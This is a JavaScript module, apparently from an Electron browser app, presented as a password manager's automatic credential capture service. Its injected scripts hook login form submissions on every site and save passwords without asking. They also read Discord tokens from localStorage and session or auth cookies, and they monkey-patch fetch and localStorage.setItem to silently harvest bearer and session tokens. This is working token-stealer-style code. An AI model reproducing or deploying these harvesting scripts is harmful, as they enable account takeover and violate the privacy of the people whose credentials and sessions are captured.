/**
 * 🔐 Credential Capture Service
 * Servicio universal para capturar credenciales de login en cualquier sitio web
 */

import PasswordManagerService from './password-manager-service.js';

/**
 * Script de inyección para capturar formularios de login
 * Se inyecta en cada página web para detectar envíos de formularios
 */
export const CREDENTIAL_CAPTURE_SCRIPT = `
(function() {
  console.log('🔐 [CredentialCapture] Script de captura activado');
  
  // Función para extraer el dominio de la URL
  function getDomain(url) {
    try {
      const urlObj = new URL(url);
      return urlObj.hostname.replace('www.', '');
    } catch {
      return url;
    }
  }
  
  // Función para obtener el favicon
  function getFaviconUrl() {
    const links = document.querySelectorAll('link[rel*="icon"]');
    if (links.length > 0) {
      return links[0].href;
    }
    return window.location.origin + '/favicon.ico';
  }
  
  // Detectar campos de formulario de login
  function detectLoginFields(form) {
    const fields = {
      username: null,
      email: null,
      password: null,
      usernameValue: null,
      emailValue: null,
      passwordValue: null
    };
    
    // Buscar campos de contraseña
    const passwordFields = form.querySelectorAll('input[type="password"]');
    if (passwordFields.length > 0) {
      fields.password = passwordFields[0];
      fields.passwordValue = passwordFields[0].value;
    }
    
    // Buscar campos de email
    const emailFields = form.querySelectorAll('input[type="email"]');
    if (emailFields.length > 0) {
      fields.email = emailFields[0];
      fields.emailValue = emailFields[0].value;
    }
    
    // Buscar campos de texto que puedan ser username
    const textFields = form.querySelectorAll('input[type="text"], input[type="tel"], input:not([type])');
    for (const field of textFields) {
      const name = (field.name || field.id || field.placeholder || '').toLowerCase();
      if (name.includes('user') || name.includes('email') || name.includes('login') || 
          name.includes('account') || name.includes('telefon') || name.includes('phone')) {
        if (!fields.email && (name.includes('email') || name.includes('@'))) {
          fields.email = field;
          fields.emailValue = field.value;
        } else if (!fields.username) {
          fields.username = field;
          fields.usernameValue = field.value;
        }
      }
    }
    
    return fields;
  }
  
  // Capturar envío de formularios
  function captureFormSubmit(form) {
    form.addEventListener('submit', function(e) {
      try {
        const fields = detectLoginFields(form);
        
        // Verificar que tengamos al menos contraseña y username/email
        if (!fields.passwordValue) {
          console.log('🔐 [CredentialCapture] No se detectó contraseña, ignorando formulario');
          return;
        }
        
        if (!fields.usernameValue && !fields.emailValue) {
          console.log('🔐 [CredentialCapture] No se detectó usuario/email, ignorando formulario');
          return;
        }
        
        const credentialData = {
          url: window.location.href,
          domain: getDomain(window.location.href),
          username: fields.usernameValue || fields.emailValue || '',
          email: fields.emailValue || null,
          password: fields.passwordValue,
          faviconUrl: getFaviconUrl(),
          formAction: form.action || window.location.href,
          timestamp: new Date().toISOString()
        };
        
        console.log('🔐 [CredentialCapture] Credenciales detectadas:', {
          domain: credentialData.domain,
          username: credentialData.username,
          hasPassword: !!credentialData.password
        });
        
        // Enviar al proceso principal de Electron
        if (window.electronAPI && window.electronAPI.passwordManager) {
          window.electronAPI.passwordManager.captureCredential(credentialData);
        } else if (window.electron && window.electron.ipcRenderer) {
          window.electron.ipcRenderer.send('credential-captured', credentialData);
        }
        
      } catch (error) {
        console.error('🔐 [CredentialCapture] Error capturando credenciales:', error);
      }
    });
  }
  
  // Capturar cambios en inputs (para autoguardado)
  let captureTimeout = null;
  function setupInputListeners() {
    const forms = document.querySelectorAll('form');
    
    forms.forEach(form => {
      const passwordFields = form.querySelectorAll('input[type="password"]');
      
      passwordFields.forEach(passwordField => {
        passwordField.addEventListener('change', () => {
          clearTimeout(captureTimeout);
          captureTimeout = setTimeout(() => {
            const fields = detectLoginFields(form);
            if (fields.passwordValue && (fields.usernameValue || fields.emailValue)) {
              console.log('🔐 [CredentialCapture] Credenciales modificadas, listas para captura');
            }
          }, 500);
        });
      });
    });
  }
  
  // Inicializar captura en todos los formularios
  function initializeCapture() {
    const forms = document.querySelectorAll('form');
    console.log(\`🔐 [CredentialCapture] Encontrados \${forms.length} formularios\`);
    
    forms.forEach(form => {
      captureFormSubmit(form);
    });
    
    setupInputListeners();
  }
  
  // Observer para detectar nuevos formularios (SPAs)
  const observer = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
      mutation.addedNodes.forEach(node => {
        if (node.nodeType === 1) { // ELEMENT_NODE
          if (node.tagName === 'FORM') {
            captureFormSubmit(node);
          } else {
            const forms = node.querySelectorAll('form');
            forms.forEach(form => captureFormSubmit(form));
          }
        }
      });
    });
  });
  
  // Inicializar cuando el DOM esté listo
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeCapture);
  } else {
    initializeCapture();
  }
  
  // Observar cambios en el DOM
  observer.observe(document.body, {
    childList: true,
    subtree: true
  });
  
  console.log('✅ [CredentialCapture] Sistema de captura inicializado');
})();
`;

/**
 * Procesa y guarda las credenciales capturadas
 */
export async function processCapturedCredential(credentialData) {
  try {
    console.log('🔐 [CredentialCapture] Procesando credencial capturada:', {
      domain: credentialData.domain,
      username: credentialData.username
    });
    
    // Verificar si ya existe una credencial para este dominio y usuario
    const existing = await PasswordManagerService.findCredentialsByDomain(credentialData.domain);
    
    if (existing.success && existing.credentials.length > 0) {
      const match = existing.credentials.find(c => c.username === credentialData.username);
      
      if (match) {
        console.log('🔐 [CredentialCapture] Credencial existente encontrada, preguntando al usuario si actualizar');
        return {
          success: true,
          action: 'update_prompt',
          existingId: match.id,
          message: '¿Actualizar credencial existente?',
          data: credentialData
        };
      }
    }
    
    // Guardar nueva credencial
    const result = await PasswordManagerService.saveCredential({
      url: credentialData.url,
      domain: credentialData.domain,
      username: credentialData.username,
      password: credentialData.password,
      email: credentialData.email,
      faviconUrl: credentialData.faviconUrl,
      notes: `Capturado automáticamente el ${new Date(credentialData.timestamp).toLocaleString()}`
    });
    
    if (result.success) {
      console.log('✅ [CredentialCapture] Credencial guardada exitosamente');
      return {
        success: true,
        action: 'saved',
        id: result.id,
        message: 'Credencial guardada correctamente'
      };
    }
    
    return result;
    
  } catch (error) {
    console.error('❌ [CredentialCapture] Error procesando credencial:', error);
    return {
      success: false,
      error: error.message
    };
  }
}

/**
 * Captura tokens de autenticación desde cookies o localStorage
 */
export const TOKEN_CAPTURE_SCRIPT = `
(function() {
  console.log('🎫 [TokenCapture] Script de captura de tokens activado');
  
  // Función para capturar tokens de Discord
  function captureDiscordToken() {
    try {
      // Buscar en localStorage
      const token = localStorage.getItem('token');
      if (token) {
        console.log('🎫 [TokenCapture] Token de Discord encontrado en localStorage');
        
        if (window.electron && window.electron.ipcRenderer) {
          window.electron.ipcRenderer.send('token-captured', {
            service: 'Discord',
            domain: 'discord.com',
            token: token,
            source: 'localStorage',
            timestamp: new Date().toISOString()
          });
        }
      }
      
      // Buscar en cookies
      const cookies = document.cookie.split(';');
      for (const cookie of cookies) {
        const [name, value] = cookie.trim().split('=');
        if (name === 'token' || name.includes('auth') || name.includes('session')) {
          console.log(\`🎫 [TokenCapture] Token encontrado en cookie: \${name}\`);
          
          if (window.electron && window.electron.ipcRenderer) {
            window.electron.ipcRenderer.send('token-captured', {
              service: document.domain,
              domain: document.domain,
              token: value,
              tokenName: name,
              source: 'cookie',
              timestamp: new Date().toISOString()
            });
          }
        }
      }
    } catch (error) {
      console.error('🎫 [TokenCapture] Error capturando token:', error);
    }
  }
  
  // Interceptar requests para capturar tokens en headers
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    return originalFetch.apply(this, args).then(response => {
      try {
        // Capturar token del header Authorization
        const authHeader = response.headers.get('Authorization');
        if (authHeader) {
          console.log('🎫 [TokenCapture] Token encontrado en Authorization header');
          
          if (window.electron && window.electron.ipcRenderer) {
            window.electron.ipcRenderer.send('token-captured', {
              service: document.domain,
              domain: document.domain,
              token: authHeader.replace('Bearer ', ''),
              source: 'authorization_header',
              timestamp: new Date().toISOString()
            });
          }
        }
      } catch (error) {
        console.error('🎫 [TokenCapture] Error interceptando fetch:', error);
      }
      
      return response;
    });
  };
  
  // Ejecutar captura después de login
  setTimeout(captureDiscordToken, 2000);
  
  // Observar cambios en localStorage
  const originalSetItem = localStorage.setItem;
  localStorage.setItem = function(key, value) {
    if (key === 'token' || key.includes('auth') || key.includes('session')) {
      console.log(\`🎫 [TokenCapture] Nuevo token detectado en localStorage: \${key}\`);
      
      if (window.electron && window.electron.ipcRenderer) {
        window.electron.ipcRenderer.send('token-captured', {
          service: document.domain,
          domain: document.domain,
          token: value,
          tokenName: key,
          source: 'localStorage',
          timestamp: new Date().toISOString()
        });
      }
    }
    
    return originalSetItem.apply(this, arguments);
  };
  
  console.log('✅ [TokenCapture] Sistema de captura de tokens inicializado');
})();
`;

/**
 * Procesa y guarda tokens capturados
 */
export async function processCapturedToken(tokenData) {
  try {
    console.log('🎫 [TokenCapture] Procesando token capturado:', {
      service: tokenData.service,
      source: tokenData.source
    });
    
    const result = await PasswordManagerService.saveAuthToken({
      serviceName: tokenData.service,
      serviceUrl: `https://${tokenData.domain}`,
      tokenType: 'bearer',
      token: tokenData.token,
      notes: `Capturado desde ${tokenData.source} el ${new Date(tokenData.timestamp).toLocaleString()}`
    });
    
    if (result.success) {
      console.log('✅ [TokenCapture] Token guardado exitosamente');
      return {
        success: true,
        action: 'saved',
        id: result.id,
        message: 'Token guardado correctamente'
      };
    }
    
    return result;
    
  } catch (error) {
    console.error('❌ [TokenCapture] Error procesando token:', error);
    return {
      success: false,
      error: error.message
    };
  }
}

export default {
  CREDENTIAL_CAPTURE_SCRIPT,
  TOKEN_CAPTURE_SCRIPT,
  processCapturedCredential,
  processCapturedToken
};
